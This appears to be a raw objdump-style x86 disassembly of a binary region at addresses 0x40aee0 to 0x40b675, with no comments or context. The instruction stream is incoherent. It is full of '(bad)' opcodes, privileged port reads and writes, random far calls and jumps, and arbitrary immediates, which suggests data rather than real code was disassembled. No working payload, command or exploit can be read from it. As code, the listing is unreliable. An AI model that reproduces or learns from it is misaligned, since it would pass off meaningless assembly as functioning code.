  40aee0:	addr16 pusha 
  40aee2:	or     BYTE PTR [bx+di+0x2230],dl
  40aee7:	jmp    0x40ae9d
  40aee9:	in     eax,dx
  40aeea:	sbb    ah,bl
  40aeec:	xchg   ebx,eax
  40aeed:	fwait
  40aeee:	sub    al,BYTE PTR [esi+0x117993f6]
  40aef4:	retf   
  40aef5:	inc    esp
  40aef6:	lock in al,0xc
  40aef9:	inc    esi
  40aefa:	pop    edi
  40aefb:	ret    0x6b16
  40aefe:	test   DWORD PTR [ebp+ecx*2+0x65eb72d0],0x7a004a98
  40af09:	xor    ecx,DWORD PTR [ecx+esi*1+0x1c]
  40af0d:	push   0x12740d42
  40af12:	or     bl,dl
  40af14:	mov    al,0x5
  40af16:	xchg   eax,ebx
  40af18:	jge    0x40af1a
  40af1a:	loope  0x40aeeb
  40af1c:	data16 cmc 
  40af1e:	add    BYTE PTR ss:[esi+ebp*2],bl
  40af22:	mov    ecx,0x8d37d697
  40af27:	push   cs
  40af28:	push   ds
  40af29:	mov    cl,0x39
  40af2b:	cmp    al,BYTE PTR [esi+esi*1]
  40af2e:	cmp    BYTE PTR [ebx+ebx*1+0xadcf5ed],dh
  40af35:	test   DWORD PTR [edx],0x80f8190b
  40af3b:	push   ds
  40af3c:	add    DWORD PTR [eax+0x7d97b3bd],eax
  40af42:	(bad)  
  40af43:	ins    BYTE PTR es:[edi],dx
  40af44:	jecxz  0x40aee8
  40af46:	push   ecx
  40af47:	or     eax,0x65f45372
  40af4c:	loop   0x40afa8
  40af4e:	dec    esp
  40af4f:	sbb    dl,BYTE PTR [ebx+edi*2+0x1e014fb1]
  40af56:	test   DWORD PTR ds:0xb31314db,ebx
  40af5c:	repnz cmp ah,BYTE PTR [ecx-0xc]
  40af60:	out    0xf2,eax
  40af62:	shl    DWORD PTR [ebp+0x28],0x4c
  40af66:	cld    
  40af67:	lds    eax,FWORD PTR [ebx+ecx*1]
  40af6a:	sbb    esi,0x6a242a27
  40af70:	sbb    DWORD PTR [ecx+0x1f],eax
  40af73:	cli    
  40af74:	mov    bh,0xac
  40af76:	jmp    0x40afb9
  40af78:	push   esp
  40af79:	loopne 0x40afa0
  40af7b:	std    
  40af7c:	retf   
  40af7d:	out    dx,al
  40af7e:	aas    
  40af7f:	sub    eax,0xa56dc40d
  40af84:	push   eax
  40af85:	mov    ebx,0x6c00e98c
  40af8a:	fstp   QWORD PTR [ebx-0x66]
  40af8d:	out    dx,al
  40af8e:	shl    BYTE PTR [ebp+0x2d],1
  40af91:	and    BYTE PTR [esi+0x4e558aca],dl
  40af97:	jno    0x40afd4
  40af99:	jle    0x40afaa
  40af9b:	leave  
  40af9c:	mov    fs,ebx
  40af9e:	cmp    dh,BYTE PTR [esi+eax*2]
  40afa1:	mov    cl,0x55
  40afa3:	call   0xc0639bb9
  40afa8:	stos   DWORD PTR es:[edi],eax
  40afa9:	mov    ds:0xcbedda3f,al
  40afae:	xchg   edi,eax
  40afaf:	cli    
  40afb0:	(bad)  
  40afb2:	or     DWORD PTR [ebx+0x17],eax
  40afb5:	xchg   esp,eax
  40afb6:	lods   al,BYTE PTR ds:[esi]
  40afb7:	out    0x29,eax
  40afb9:	and    DWORD PTR [ecx+0x64],esp
  40afbc:	dec    edx
  40afbd:	mov    eax,0x723bc34c
  40afc2:	scas   al,BYTE PTR es:[edi]
  40afc3:	xor    BYTE PTR [ecx+0x24],cl
  40afc6:	push   ebp
  40afc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40afc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40afc9:	cmp    esi,DWORD PTR [ecx+0x12]
  40afcc:	mov    edx,DWORD PTR [edi+0x6ffcf115]
  40afd2:	std    
  40afd3:	sub    DWORD PTR [edi],0xe8cfc8f9
  40afd9:	cmp    BYTE PTR [ebx+0x77881817],0x18
  40afe0:	mov    bh,ch
  40afe2:	sbb    DWORD PTR [edx],esp
  40afe4:	(bad)  
  40afe5:	clc    
  40afe6:	dec    ecx
  40afe7:	mov    ecx,0xff86eec7
  40afec:	sbb    edi,DWORD PTR [ebx+esi*8-0x20]
  40aff0:	pop    esi
  40aff1:	jecxz  0x40af8d
  40aff3:	sbb    al,0x44
  40aff5:	fbld   TBYTE PTR [esi+0x395fcecc]
  40affb:	in     al,dx
  40affc:	dec    esi
  40affd:	cmc    
  40affe:	add    BYTE PTR [edi],al
  40b000:	xor    BYTE PTR [edi],0x9a
  40b003:	iret   
  40b004:	ss ss fucomip st,st(5)
  40b008:	fisub  DWORD PTR [ebx-0x2f909019]
  40b00e:	adc    BYTE PTR [esi+0xa],0x32
  40b012:	jl     0x40b034
  40b014:	(bad)  [edi-0x8]
  40b017:	ror    ecx,0x13
  40b01a:	lahf   
  40b01b:	jle    0x40afc0
  40b01d:	sahf   
  40b01e:	lods   al,BYTE PTR ds:[esi]
  40b01f:	cmp    eax,0x42e8ee79
  40b024:	jae    0x40b020
  40b026:	xchg   edx,eax
  40b027:	(bad)
  40b02b:	or     DWORD PTR [ebp-0x2ea42380],esp
  40b031:	ds mov ebp,0x45e401be
  40b037:	fwait
  40b038:	and    BYTE PTR [ebp-0x60],dh
  40b03b:	pop    ds
  40b03c:	sub    BYTE PTR [ebp+0x6e],0x3c
  40b040:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b041:	stos   BYTE PTR es:[edi],al
  40b042:	btc    DWORD PTR [eax+0x75],esp
  40b046:	xchg   ebx,eax
  40b047:	stos   DWORD PTR es:[edi],eax
  40b048:	mov    WORD PTR [esi],cs
  40b04a:	xor    DWORD PTR [edi],ebp
  40b04c:	sbb    BYTE PTR [eax],al
  40b04e:	sub    eax,0xfe5c7aa8
  40b053:	ss dec ecx
  40b055:	lods   al,BYTE PTR ds:[esi]
  40b056:	inc    eax
  40b057:	sahf   
  40b058:	inc    ebx
  40b059:	cmpxchg8b QWORD PTR [ebp+0x30878c9e]
  40b060:	adc    ch,BYTE PTR [edi+0x3170c09]
  40b066:	dec    eax
  40b067:	enter  0x59f5,0xff
  40b06b:	ds inc ecx
  40b06d:	sbb    dh,BYTE PTR [ebx-0x4e]
  40b070:	push   ebp
  40b071:	data16 (bad) 
  40b073:	jecxz  0x40b03f
  40b075:	adc    esp,eax
  40b077:	iret   
  40b078:	and    ebp,DWORD PTR [edi-0x79fbf3b5]
  40b07e:	loope  0x40b0fe
  40b080:	sahf   
  40b081:	leave  
  40b082:	mov    al,bl
  40b084:	jae    0x40b0b2
  40b086:	xchg   esp,eax
  40b087:	js     0x40b040
  40b089:	(bad)  
  40b08a:	mov    ds:0x11ce2caa,al
  40b08f:	cmp    BYTE PTR [edi-0x491d86c7],cl
  40b095:	mov    edi,0xdd3555db
  40b09a:	loope  0x40b01e
  40b09c:	push   esp
  40b09d:	sbb    bl,BYTE PTR [ebx+0x18f1b503]
  40b0a3:	adc    al,0x5f
  40b0a5:	mov    ah,0x40
  40b0a7:	and    DWORD PTR [ebx+0x48],edi
  40b0aa:	dec    eax
  40b0ab:	ds jmp 0x1a1:0x98e01369
  40b0b3:	dec    ebx
  40b0b4:	jp     0x40b0c2
  40b0b6:	push   ss
  40b0b7:	adc    al,0xe6
  40b0b9:	in     eax,dx
  40b0ba:	or     DWORD PTR [eax],ebp
  40b0bc:	clc    
  40b0bd:	adc    bh,bl
  40b0bf:	push   0x519762da
  40b0c4:	lds    edx,FWORD PTR [esi]
  40b0c6:	cmc    
  40b0c7:	and    DWORD PTR [eax-0x58],edx
  40b0ca:	xor    esi,DWORD PTR [ecx+0x402ef1dc]
  40b0d0:	lock dec esp
  40b0d2:	sbb    edi,DWORD PTR [ecx]
  40b0d4:	or     dl,BYTE PTR [edx]
  40b0d6:	push   esi
  40b0d7:	jg     0x40b0fd
  40b0d9:	xchg   BYTE PTR [ebp+0x5c],dh
  40b0dc:	sar    BYTE PTR [ebx],1
  40b0de:	cld    
  40b0df:	std    
  40b0e0:	pop    edx
  40b0e1:	mul    ebx
  40b0e3:	jecxz  0x40b0ba
  40b0e5:	pop    edi
  40b0e6:	ficom  WORD PTR [ecx]
  40b0e8:	icebp  
  40b0e9:	aam    0x7c
  40b0eb:	dec    ecx
  40b0ec:	sbb    al,0x76
  40b0ee:	cli    
  40b0ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b0f1:	add    bl,BYTE PTR [esi+eiz*2+0x1939f372]
  40b0f8:	lds    edi,FWORD PTR ds:0x3e6a42d5
  40b0fe:	xchg   esi,eax
  40b0ff:	inc    eax
  40b100:	and    BYTE PTR [eax],al
  40b102:	xor    esp,DWORD PTR [ebp-0x3be3dc3d]
  40b108:	lock mov ecx,0xfc66a796
  40b10e:	push   es
  40b10f:	int    0x6b
  40b111:	rcl    DWORD PTR [esi-0x556db53d],0x55
  40b118:	mov    al,ds:0x6f09a65b
  40b11d:	xor    dl,BYTE PTR [eax+0xb]
  40b120:	jg     0x40b0ef
  40b122:	retf   
  40b123:	sbb    ebx,edi
  40b125:	arpl   WORD PTR [esi+0x0],dx
  40b128:	push   esi
  40b129:	call   0x651f:0xb368d793
  40b130:	(bad)  
  40b131:	jle    0x40b128
  40b133:	mov    edi,0xb72f881f
  40b138:	fdiv   DWORD PTR [esi]
  40b13a:	jmp    0x2e77:0xb20354b4
  40b141:	(bad)  
  40b142:	leave  
  40b143:	gs or  eax,0x1cd89703
  40b149:	pusha  
  40b14a:	shr    DWORD PTR [edx+0x9097137],cl
  40b150:	rol    ah,0x9b
  40b153:	lock je 0x40b160
  40b156:	xor    al,0xa1
  40b158:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b159:	xor    DWORD PTR [ecx],0x67
  40b15c:	dec    ecx
  40b15d:	pop    es
  40b15e:	sub    BYTE PTR [ebp-0x71],bh
  40b161:	in     eax,dx
  40b162:	rcr    BYTE PTR [edi+0x39506825],cl
  40b168:	in     al,dx
  40b169:	add    al,0x99
  40b16b:	test   edi,0xedced758
  40b171:	je     0x40b119
  40b173:	xchg   esi,eax
  40b174:	mov    edx,0x108e71b5
  40b179:	push   ds
  40b17a:	jl     0x40b1aa
  40b17c:	or     ebx,DWORD PTR ds:0x416ba894
  40b182:	not    DWORD PTR [ecx+0x74]
  40b185:	push   ds
  40b186:	dec    ecx
  40b187:	pop    esi
  40b188:	ret    0xb234
  40b18b:	mov    dl,0xae
  40b18d:	sub    eax,0x9e82fad
  40b192:	push   edx
  40b193:	or     bh,BYTE PTR [edi-0x40]
  40b196:	arpl   di,bp
  40b198:	retf   
  40b199:	scas   al,BYTE PTR es:[edi]
  40b19a:	mov    ds:0x56717995,eax
  40b19f:	stos   BYTE PTR es:[edi],al
  40b1a0:	add    DWORD PTR [ebp+0x1a13af55],ebx
  40b1a6:	xchg   ebp,eax
  40b1a7:	pop    edi
  40b1a8:	mov    esi,0xdac1e593
  40b1ad:	setle  BYTE PTR [eax+0x13]
  40b1b1:	mov    ebp,0x11077992
  40b1b6:	mov    ebx,DWORD PTR [ebp-0x12ac9f]
  40b1bc:	dec    ebx
  40b1bd:	das    
  40b1be:	inc    ecx
  40b1bf:	(bad)  
  40b1c1:	cwde   
  40b1c2:	popf   
  40b1c3:	push   ds
  40b1c4:	jno    0x40b243
  40b1c6:	les    edi,FWORD PTR [edi+esi*8-0x49]
  40b1ca:	(bad)  
  40b1cb:	outs   dx,DWORD PTR gs:[esi]
  40b1cd:	(bad)  
  40b1ce:	imul   ebx,edx,0xffffffce
  40b1d1:	sub    esi,esp
  40b1d3:	neg    BYTE PTR [edx+0x5762a2dd]
  40b1d9:	push   ebp
  40b1da:	dec    edi
  40b1db:	sar    DWORD PTR [ebx+0x4761b6f5],cl
  40b1e1:	out    0xa6,al
  40b1e3:	or     DWORD PTR [ebx+0x2a64ee7c],eax
  40b1e9:	in     al,0xe
  40b1eb:	push   ebp
  40b1ec:	shl    DWORD PTR [edx+0x7c],1
  40b1ef:	adc    bh,cl
  40b1f1:	push   DWORD PTR [ebx-0x7a2d9331]
  40b1f7:	outs   dx,BYTE PTR ds:[esi]
  40b1f8:	(bad)  
  40b1f9:	stos   DWORD PTR es:[edi],eax
  40b1fa:	je     0x40b1b5
  40b1fc:	cmpxchg BYTE PTR [edx],bl
  40b1ff:	popf   
  40b200:	pop    es
  40b201:	clc    
  40b202:	cmp    esi,edx
  40b204:	ror    bl,0x3c
  40b207:	int3   
  40b208:	mov    edx,0x6760615e
  40b20d:	leave  
  40b20e:	pop    edi
  40b20f:	outs   dx,BYTE PTR ds:[esi]
  40b210:	and    al,0x1a
  40b212:	adc    al,0xa0
  40b214:	and    BYTE PTR [esi],dh
  40b216:	lods   al,BYTE PTR ds:[esi]
  40b217:	dec    edi
  40b218:	js     0x40b207
  40b21a:	(bad)  
  40b21b:	mov    eax,ds:0x570ae61f
  40b220:	js     0x40b1df
  40b222:	imul   ebp,DWORD PTR [esi],0x78cd306f
  40b228:	jno    0x40b1dd
  40b22a:	dec    eax
  40b22b:	push   esi
  40b22c:	fwait
  40b22d:	jmp    0x40b1fd
  40b22f:	icebp  
  40b230:	imul   esp,DWORD PTR [edi+0x7f],0x2e5a9dd3
  40b237:	arpl   WORD PTR [edx+eax*2-0x4e24d6df],ax
  40b23e:	loopne 0x40b279
  40b240:	xchg   ebp,eax
  40b241:	inc    eax
  40b242:	mov    bh,0xf8
  40b244:	stos   DWORD PTR es:[edi],eax
  40b245:	xchg   ebp,eax
  40b246:	js     0x40b1dd
  40b248:	xchg   esp,eax
  40b249:	mov    ds:0x7a90bc53,eax
  40b24e:	or     DWORD PTR [esi+0x61],edi
  40b251:	xchg   BYTE PTR [ebx],bh
  40b253:	mov    dh,0x7c
  40b255:	sub    al,0xb4
  40b257:	pop    edx
  40b258:	push   ss
  40b259:	sbb    BYTE PTR [esi],dh
  40b25b:	mov    cl,0x14
  40b25d:	push   cs
  40b25e:	mov    ah,0xf9
  40b260:	ficom  WORD PTR [ecx]
  40b262:	xor    al,0xe1
  40b264:	loopne 0x40b21a
  40b266:	and    DWORD PTR [ebx],eax
  40b268:	mov    ecx,0x30fcebc8
  40b26d:	jmp    DWORD PTR [ecx-0x95894f5]
  40b273:	mov    al,cs:0x63034818
  40b279:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b27a:	fsubr  QWORD PTR [ebp-0x6a]
  40b27d:	lods   al,BYTE PTR ds:[esi]
  40b27e:	je     0x40b29c
  40b280:	adc    al,0x13
  40b282:	(bad)  
  40b283:	out    dx,al
  40b284:	xor    BYTE PTR [ebp+0x8221fed],dl
  40b28a:	es repz or bh,dh
  40b28e:	add    cl,cl
  40b290:	mov    dh,0xd2
  40b292:	hlt    
  40b293:	sub    cl,ah
  40b295:	(bad)  
  40b296:	das    
  40b297:	fadd   st(3),st
  40b299:	dec    esp
  40b29a:	inc    esp
  40b29b:	imul   edi,ebp,0xa78daa92
  40b2a1:	or     al,0xa
  40b2a3:	ins    DWORD PTR es:[edi],dx
  40b2a4:	and    al,0x3b
  40b2a6:	xchg   edi,eax
  40b2a7:	mov    BYTE PTR ds:0xb3b650,bl
  40b2ad:	mov    ah,0x91
  40b2af:	sbb    ch,BYTE PTR [edx]
  40b2b1:	push   eax
  40b2b2:	stos   DWORD PTR es:[edi],eax
  40b2b3:	call   0xf733:0xafbee56c
  40b2ba:	pop    esp
  40b2bb:	adc    eax,DWORD PTR [ebp-0x1d4dd253]
  40b2c1:	adc    eax,0x13b0b931
  40b2c6:	and    edi,DWORD PTR [esi+ebp*4-0x83444af]
  40b2cd:	fnstsw WORD PTR [esp+edx*4-0x26]
  40b2d1:	jb     0x40b306
  40b2d3:	inc    ecx
  40b2d4:	mov    ch,0x5
  40b2d6:	cmp    cl,bh
  40b2d8:	dec    ebx
  40b2d9:	aam    0x3f
  40b2db:	push   ecx
  40b2dc:	mov    al,ss:0x9c988132
  40b2e2:	test   BYTE PTR [eax],dh
  40b2e4:	mov    dl,0x43
  40b2e6:	enter  0xb82a,0xdd
  40b2ea:	and    al,0x8a
  40b2ec:	push   edx
  40b2ed:	dec    esi
  40b2ee:	nop
  40b2ef:	shl    BYTE PTR [esi+eiz*8-0x15891146],cl
  40b2f6:	cmp    eax,0x7591ded5
  40b2fb:	sub    cl,BYTE PTR ds:0xf5e66baf
  40b301:	add    DWORD PTR [edx],esp
  40b303:	ret    
  40b304:	(bad)  
  40b305:	icebp  
  40b306:	push   ecx
  40b307:	cmp    DWORD PTR es:[esi-0x21],edx
  40b30b:	adc    eax,0xe6b725e2
  40b310:	mov    esi,0xabd47cdd
  40b315:	(bad)  
  40b316:	xchg   ebp,eax
  40b317:	fld    TBYTE PTR [ebx]
  40b319:	mov    ecx,0xd6f49d3f
  40b31e:	sub    DWORD PTR [edi-0x2373ed1c],ebp
  40b324:	into   
  40b325:	mov    dh,0x4b
  40b327:	dec    ecx
  40b328:	mov    ds:0x91e1c372,al
  40b32d:	shr    DWORD PTR [esi-0x7dedc1e3],cl
  40b333:	xchg   esi,eax
  40b334:	sar    ebx,0xf4
  40b337:	cmp    esp,esp
  40b339:	in     eax,0x2b
  40b33b:	dec    ebx
  40b33c:	leave  
  40b33d:	test   eax,0xc10a3d0f
  40b342:	add    eax,0x527b5cf1
  40b347:	imul   BYTE PTR [ecx-0x76c8be80]
  40b34d:	jg     0x40b302
  40b34f:	sbb    DWORD PTR [edi-0x1471edd5],edi
  40b355:	lock or eax,0x347b6d1b
  40b35b:	cmp    al,BYTE PTR [esi-0x51e87e0c]
  40b361:	jge    0x40b396
  40b363:	rcr    cl,1
  40b365:	sahf   
  40b366:	gs stc 
  40b368:	dec    esp
  40b369:	pop    esp
  40b36a:	rol    BYTE PTR [ebx+0x6a],1
  40b36d:	(bad)  
  40b36e:	adc    ebx,DWORD PTR [ecx-0xf2ef929]
  40b374:	popa   
  40b375:	xchg   edi,eax
  40b376:	adc    DWORD PTR ds:0x85e3de3f,esp
  40b37c:	sub    edx,DWORD PTR [esi]
  40b37e:	in     eax,dx
  40b37f:	imul   eax,DWORD PTR [esi+0x2f6d0760],0xffffffda
  40b386:	sbb    eax,0xadc8c196
  40b38b:	mov    WORD PTR [ebx-0x4a],ss
  40b38e:	push   ds
  40b38f:	inc    edi
  40b390:	sbb    cl,ah
  40b392:	mov    dl,0xac
  40b394:	movzx  edi,BYTE PTR [edx-0x72]
  40b398:	adc    DWORD PTR [eax],eax
  40b39a:	xchg   ecx,eax
  40b39b:	test   eax,0x11eaeaa0
  40b3a0:	mov    eax,DWORD PTR [edi-0x78]
  40b3a3:	jno    0x40b3c2
  40b3a5:	push   eax
  40b3a6:	pop    eax
  40b3a7:	xlat   BYTE PTR ds:[ebx]
  40b3a8:	bnd jb 0x40b3b0
  40b3ab:	fistp  DWORD PTR cs:[edx-0x4aede152]
  40b3b2:	sub    al,0xa4
  40b3b4:	cld    
  40b3b5:	cmp    esp,DWORD PTR [edx+0x7d]
  40b3b8:	(bad)  
  40b3ba:	mov    esp,0x4bbd28e0
  40b3bf:	sbb    esp,DWORD PTR [ecx+ebp*4+0x1debdce2]
  40b3c6:	lods   eax,DWORD PTR ds:[esi]
  40b3c7:	retf   
  40b3c8:	in     eax,0xf8
  40b3ca:	aaa    
  40b3cb:	into   
  40b3cc:	dec    edx
  40b3cd:	loopne 0x40b36d
  40b3cf:	jb     0x40b3ee
  40b3d1:	xor    DWORD PTR [edi-0x45190af1],edx
  40b3d7:	inc    esi
  40b3d8:	dec    edx
  40b3d9:	pop    eax
  40b3da:	push   edi
  40b3db:	dec    esp
  40b3dc:	ins    BYTE PTR es:[edi],dx
  40b3dd:	dec    esi
  40b3de:	fild   QWORD PTR [esi]
  40b3e0:	fnstsw WORD PTR es:[ebx+eax*1]
  40b3e4:	cli    
  40b3e5:	int    0xde
  40b3e7:	cdq    
  40b3e8:	adc    BYTE PTR [eax+eax*2-0x1e],ah
  40b3ec:	xor    eax,0xdcd18372
  40b3f1:	jl     0x40b3dd
  40b3f3:	push   esp
  40b3f4:	mov    eax,0x22e9e513
  40b3f9:	cmc    
  40b3fa:	jmp    DWORD PTR [edi+0x430fdecb]
  40b400:	icebp  
  40b401:	jnp    0x40b423
  40b403:	dec    edx
  40b404:	out    dx,al
  40b405:	fstp   st(7)
  40b407:	dec    esp
  40b408:	(bad)  
  40b409:	or     esp,DWORD PTR [ebp+eiz*8+0x17]
  40b40d:	mov    ebp,ds
  40b40f:	ins    BYTE PTR es:[edi],dx
  40b410:	dec    edx
  40b411:	push   edx
  40b412:	cmc    
  40b413:	cli    
  40b414:	xchg   ebx,eax
  40b415:	cld    
  40b416:	jnp    0x40b3f0
  40b418:	cmp    bl,ch
  40b41a:	fbld   TBYTE PTR [eax]
  40b41c:	repnz int3 
  40b41e:	stc    
  40b41f:	or     esi,edi
  40b421:	jecxz  0x40b3c4
  40b423:	or     BYTE PTR [edx],cl
  40b425:	sbb    eax,0x1d859b10
  40b42a:	or     DWORD PTR [ebx-0x1f41a575],ecx
  40b430:	xchg   DWORD PTR [edx-0xd04cf21],edx
  40b436:	xchg   BYTE PTR [esi-0x5a],ah
  40b439:	shr    DWORD PTR [esi+ebp*1],1
  40b43c:	sti    
  40b43d:	hlt    
  40b43e:	xchg   edi,eax
  40b43f:	jle    0x40b4b9
  40b441:	cmp    DWORD PTR [esi+0x37],0x66
  40b445:	add    eax,0xb12f4c38
  40b44a:	je     0x40b3da
  40b44c:	jg     0x40b4b6
  40b44e:	int    0x33
  40b450:	out    dx,eax
  40b451:	xor    esp,ebx
  40b453:	or     al,0xf1
  40b455:	or     ah,BYTE PTR [ebp-0x60ba1365]
  40b45b:	sub    eax,0x84df3b29
  40b460:	mov    edi,0xe61da40c
  40b465:	dec    ebx
  40b466:	sti    
  40b467:	scas   al,BYTE PTR es:[edi]
  40b468:	fistp  QWORD PTR [ecx-0x5d84e6f6]
  40b46e:	mov    ch,0x3b
  40b470:	mov    esi,0x774d63e2
  40b475:	rol    eax,cl
  40b477:	jmp    0x4ec96a48
  40b47c:	repz push esi
  40b47e:	sub    al,dh
  40b480:	pop    edx
  40b481:	cwde   
  40b482:	and    DWORD PTR [edx],0x10c39e42
  40b488:	dec    ebp
  40b489:	jge    0x40b419
  40b48b:	add    eax,0x87bdc14b
  40b490:	and    cl,BYTE PTR [ebx-0x7c]
  40b493:	in     al,0xa7
  40b495:	(bad)  
  40b496:	ds nop
  40b498:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b499:	jp     0x40b495
  40b49b:	pop    edx
  40b49c:	dec    edx
  40b49d:	push   ds
  40b49e:	sub    eax,0xc21d9a40
  40b4a3:	inc    ecx
  40b4a4:	add    eax,0xa12cfea0
  40b4a9:	xchg   edi,eax
  40b4aa:	dec    edx
  40b4ab:	add    DWORD PTR ds:0x9a2b3dcf,ebx
  40b4b1:	mov    ss,WORD PTR [edi+0x39b4c716]
  40b4b7:	mov    eax,ds:0x35f08ffe
  40b4bc:	(bad)  
  40b4bd:	ins    DWORD PTR es:[edi],dx
  40b4be:	and    DWORD PTR [edx-0x6c],ebp
  40b4c1:	js     0x40b531
  40b4c3:	xor    edx,edi
  40b4c5:	nop
  40b4c6:	sub    ebx,DWORD PTR [eax-0x3a]
  40b4c9:	cwde   
  40b4ca:	shl    DWORD PTR [ecx+0x70c026e3],0x3c
  40b4d1:	pop    edx
  40b4d2:	scas   al,BYTE PTR es:[edi]
  40b4d3:	xlat   BYTE PTR ds:[ebx]
  40b4d4:	inc    esp
  40b4d5:	cmp    dh,BYTE PTR [ebx+ebp*8]
  40b4d8:	mov    ch,0x40
  40b4da:	adc    ah,dl
  40b4dc:	fidivr WORD PTR [edi+0x502b918f]
  40b4e2:	fmul   DWORD PTR [ecx+ecx*2]
  40b4e5:	mov    ch,0x35
  40b4e7:	mov    esi,0x8cae9ce4
  40b4ec:	jle    0x40b4f6
  40b4ee:	data16 out dx,al
  40b4f0:	mov    ch,0xb5
  40b4f2:	or     BYTE PTR [ebp+ecx*1-0x6d],ah
  40b4f6:	mov    dx,0xe1bb
  40b4fa:	gs out 0x46,al
  40b4fd:	data16 fst QWORD PTR [edi+0x50b6e2f6]
  40b504:	adc    BYTE PTR [ebx],ah
  40b506:	mov    eax,cs:0xa9e266c9
  40b50c:	jns    0x40b564
  40b50e:	sbb    BYTE PTR ss:[ebx],0x1
  40b512:	test   DWORD PTR [ebx+0x18],0x2bca6fda
  40b519:	jne    0x40b540
  40b51b:	int3   
  40b51c:	cmc    
  40b51d:	shl    BYTE PTR [edi+0x5b429e27],1
  40b523:	mov    edi,ss
  40b525:	aad    0x68
  40b527:	jecxz  0x40b51f
  40b529:	iret   
  40b52a:	jo     0x40b59f
  40b52c:	loopne 0x40b505
  40b52e:	sbb    BYTE PTR [ebp+0x69144223],cl
  40b534:	or     DWORD PTR [esi+0x6dac7764],0xbcc825e2
  40b53e:	into   
  40b53f:	or     BYTE PTR [ebp+0x65f919bc],bh
  40b545:	pop    ebx
  40b546:	in     al,dx
  40b547:	int3   
  40b548:	cmp    eax,0xea8df25d
  40b54d:	out    0x78,al
  40b54f:	sahf   
  40b550:	cs clc 
  40b552:	dec    edx
  40b553:	or     eax,0x2416e327
  40b558:	ret    
  40b559:	jl     0x40b5b6
  40b55b:	ins    DWORD PTR es:[edi],dx
  40b55c:	cs xor eax,0xdc2e2f1d
  40b562:	mov    bh,0x97
  40b564:	ins    DWORD PTR es:[edi],dx
  40b565:	test   eax,0x3eb0c93c
  40b56a:	sahf   
  40b56b:	jge    0x40b5de
  40b56d:	outs   dx,BYTE PTR ds:[esi]
  40b56e:	xchg   edx,eax
  40b56f:	jo     0x40b525
  40b571:	nop
  40b572:	idiv   DWORD PTR [esi+0x30aa7402]
  40b578:	pop    esi
  40b579:	dec    edx
  40b57a:	inc    esp
  40b57b:	mov    ch,0x5a
  40b57d:	rcl    DWORD PTR es:[ebx-0x66],cl
  40b581:	add    DWORD PTR [eax],edx
  40b583:	push   0x40e28f2f
  40b588:	sub    cl,BYTE PTR [eax+0x79]
  40b58b:	cdq    
  40b58c:	xchg   edi,eax
  40b58d:	pop    edx
  40b58e:	(bad)  
  40b58f:	lods   al,BYTE PTR ds:[esi]
  40b590:	xchg   ecx,eax
  40b591:	inc    edi
  40b592:	ins    DWORD PTR es:[edi],dx
  40b593:	jbe    0x40b5b8
  40b595:	push   ss
  40b596:	fcmovb st,st(1)
  40b598:	mov    ch,BYTE PTR [eax+0x23]
  40b59b:	ror    ah,cl
  40b59d:	pushf  
  40b59e:	mov    bl,0xc5
  40b5a0:	rcl    DWORD PTR [edx],cl
  40b5a2:	pop    esi
  40b5a3:	repnz cmovne edx,DWORD PTR [edi-0x3b]
  40b5a8:	mov    DWORD PTR [edx+0x323a0560],edi
  40b5ae:	add    DWORD PTR [edx-0x4c],esp
  40b5b1:	or     dl,BYTE PTR [ebp+edx*1-0x6b8b802]
  40b5b8:	mov    WORD PTR [ecx],gs
  40b5ba:	not    DWORD PTR [esi+0x2000fbae]
  40b5c0:	mov    ebp,0x1533efab
  40b5c5:	cmp    eax,DWORD PTR [eax-0x1b]
  40b5c8:	call   0x2b2d:0x9f4f4947
  40b5cf:	cmp    cl,BYTE PTR [esi]
  40b5d1:	xor    eax,0x30144641
  40b5d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b5d7:	jo     0x40b57a
  40b5d9:	xlat   BYTE PTR ds:[ebx]
  40b5da:	push   es
  40b5db:	hlt    
  40b5dc:	or     BYTE PTR ds:0xae72bbbe,cl
  40b5e2:	aaa    
  40b5e3:	push   ebp
  40b5e4:	je     0x40b5a2
  40b5e6:	loopne 0x40b660
  40b5e8:	push   0x53ad2cd4
  40b5ed:	push   eax
  40b5ee:	ins    DWORD PTR es:[edi],dx
  40b5ef:	pop    esi
  40b5f0:	mov    ds:0x826c1f92,eax
  40b5f5:	inc    ecx
  40b5f6:	mov    eax,ds:0x2f1b4103
  40b5fb:	xor    al,0x78
  40b5fd:	cmc    
  40b5fe:	mov    esi,0x972a6b3
  40b603:	adc    dl,BYTE PTR [ecx+0x51e9423d]
  40b609:	cld    
  40b60a:	(bad)  [edx]
  40b60c:	data16 or al,0xb4
  40b60f:	jle    0x40b5e8
  40b611:	add    BYTE PTR [esi],ah
  40b613:	lods   al,BYTE PTR ds:[esi]
  40b614:	push   ss
  40b615:	lahf   
  40b616:	cmp    ecx,DWORD PTR [edx+0x42e5be51]
  40b61c:	int    0xac
  40b61e:	add    DWORD PTR [ebx+0x10],edi
  40b621:	pop    eax
  40b622:	xchg   edi,eax
  40b623:	mov    esp,0x78fcfaae
  40b628:	ud2    
  40b62a:	and    dl,BYTE PTR [esi+0x6f]
  40b62d:	arpl   WORD PTR [esi+eax*8-0xdc65baa],sp
  40b634:	gs and eax,0x56d78b6f
  40b63a:	adc    bh,BYTE PTR [ebx]
  40b63c:	mov    WORD PTR [esi],gs
  40b63e:	pusha  
  40b63f:	cwde   
  40b640:	es xchg edx,eax
  40b642:	push   ds
  40b643:	popf   
  40b644:	(bad)  
  40b645:	fiadd  WORD PTR [eax-0x75]
  40b648:	push   esp
  40b649:	jecxz  0x40b65d
  40b64b:	push   0x7f
  40b64d:	xchg   esp,eax
  40b64e:	xchg   BYTE PTR [edx],ah
  40b650:	lock pop ss
  40b652:	ins    DWORD PTR es:[edi],dx
  40b653:	cmp    eax,0x3b033703
  40b658:	push   ss
  40b659:	jbe    0x40b623
  40b65b:	or     ah,0x23
  40b65e:	adc    eax,0xdf4a8e51
  40b663:	sbb    al,0x1
  40b665:	mov    ecx,0xe1a70100
  40b66a:	in     eax,0x4e
  40b66c:	dec    ebp
  40b66d:	sbb    eax,0x22b3553f
  40b672:	test   DWORD PTR [ebx],edi
  40b674:	push   cs
  40b675:	dec    ebx
